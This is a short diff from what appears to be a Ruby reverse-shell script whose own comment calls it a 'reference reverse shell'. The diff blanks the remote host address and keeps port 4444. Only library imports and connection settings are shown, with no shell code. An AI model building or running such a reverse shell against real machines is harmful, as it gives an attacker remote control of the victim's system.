@@ -4,7 +4,7 @@ require 'socket'
 require 'etc'
 require 'open3'
 
-RHOST = "192.168.0.101"  
+RHOST = ""  
 PORT = "4444"
 
 #reference reverse shell: mr robot!
